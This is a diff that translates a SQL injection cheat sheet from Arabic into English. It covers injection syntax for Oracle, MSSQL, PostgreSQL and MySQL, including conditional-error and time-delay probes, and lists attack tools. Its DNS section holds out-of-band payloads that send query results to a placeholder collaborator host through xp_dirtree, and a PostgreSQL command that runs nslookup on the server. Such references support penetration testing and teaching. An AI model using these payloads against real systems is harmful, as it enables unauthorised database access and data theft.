@@ -1,25 +1,25 @@
-
+```markdown
 # 🐍 SQL Injection Cheat Sheet
 
-> **مرجع سريع** لأوامر حقن SQL في مختلف قواعد البيانات.
+> **Quick reference** for SQL injection commands across different database systems.
 
 
 
-## 📊 مقارنة قواعد البيانات
+## 📊 Database Comparison
 
-| الدالة | Oracle | Microsoft | PostgreSQL | MySQL |
-|--------|--------|-----------|------------|-------|
-| **دمج النصوص** | `'foo'||'bar'` | `'foo'+'bar'` | `'foo'||'bar'` | `CONCAT('foo','bar')` |
-| **استخراج نص** | `SUBSTR('foobar',4,2)` | `SUBSTRING('foobar',4,2)` | `SUBSTRING('foobar',4,2)` | `SUBSTRING('foobar',4,2)` |
-| **التعليق** | `--comment` | `--comment` | `--comment` | `#comment` |
-| **الإصدار** | `SELECT banner FROM v$version` | `SELECT @@version` | `SELECT version()` | `SELECT @@version` |
-| **التأخير** | `dbms_pipe.receive_message(('a'),10)` | `WAITFOR DELAY '0:0:10'` | `SELECT pg_sleep(10)` | `SELECT SLEEP(10)` |
+| Function | Oracle | Microsoft | PostgreSQL | MySQL |
+|----------|--------|-----------|------------|-------|
+| **String Concatenation** | `'foo'||'bar'` | `'foo'+'bar'` | `'foo'||'bar'` | `CONCAT('foo','bar')` |
+| **Substring Extraction** | `SUBSTR('foobar',4,2)` | `SUBSTRING('foobar',4,2)` | `SUBSTRING('foobar',4,2)` | `SUBSTRING('foobar',4,2)` |
+| **Comments** | `--comment` | `--comment` | `--comment` | `#comment` |
+| **Version** | `SELECT banner FROM v$version` | `SELECT @@version` | `SELECT version()` | `SELECT @@version` |
+| **Delay** | `dbms_pipe.receive_message(('a'),10)` | `WAITFOR DELAY '0:0:10'` | `SELECT pg_sleep(10)` | `SELECT SLEEP(10)` |
 
 ---
 
-## 🔍 الاستعلامات الأساسية
+## 🔍 Basic Queries
 
-### معرفة الجداول
+### Listing Tables
 ```sql
 -- Oracle
 SELECT * FROM all_tables
@@ -28,7 +28,7 @@ SELECT * FROM all_tables
 SELECT * FROM information_schema.tables
 ```
 
-### معرفة الأعمدة
+### Listing Columns
 ```sql
 -- Oracle
 SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME'
@@ -39,7 +39,7 @@ SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'
 
 ---
 
-## ⚠️ الأخطاء المشروطة
+## ⚠️ Conditional Errors
 
 ```sql
 -- Oracle
@@ -57,7 +57,7 @@ SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')
 
 ---
 
-## ⏱️ التأخير المشروط
+## ⏱️ Conditional Delays
 
 ```sql
 -- Oracle
@@ -75,7 +75,7 @@ SELECT IF(1=1,SLEEP(10),'a')
 
 ---
 
-## 🌐 استعلام DNS
+## 🌐 DNS Queries
 
 ```sql
 -- Microsoft (Windows)
@@ -88,7 +88,7 @@ copy (SELECT '') to program 'nslookup BURP-COLLABORATOR'
 LOAD_FILE('\\\\BURP-COLLABORATOR\\a')
 ```
 
-### تسريب البيانات عبر DNS
+### Data Exfiltration via DNS
 ```sql
 -- Microsoft
 declare @p varchar(1024);
@@ -98,7 +98,7 @@ exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR/a"')
 
 ---
 
-## 📝 أمثلة عملية
+## 📝 Practical Examples
 
 ### 1. Union Based Injection
 ```sql
@@ -127,18 +127,18 @@ exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR/a"')
 
 ---
 
-## 🛠️ أدوات مفيدة
+## 🛠️ Useful Tools
 
-| الأداة | الوصف |
-|--------|-------|
-| **SQLMap** | أداة آلية لاكتشاف واستغلال ثغرات SQLi |
-| **Burp Suite** | اعتراض وتعديل الطلبات |
-| **Havij** | أداة رسومية لاستغلال SQLi |
-| **sqlsus** | أداة سطر أوامر متقدمة |
+| Tool | Description |
+|------|-------------|
+| **SQLMap** | Automated tool for detecting and exploiting SQLi vulnerabilities |
+| **Burp Suite** | Intercepting and modifying HTTP requests |
+| **Havij** | Graphical tool for exploiting SQLi |
+| **sqlsus** | Advanced command-line tool |
 
 ---
 
-## 📚 مراجع مفيدة
+## 📚 Useful References
 
 - [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
 - [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
@@ -146,10 +146,4 @@ exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR/a"')
 
 ---
 
-<div align="center">
-
 **🐍 Happy Hacking!**
-
-</div>
-```
-
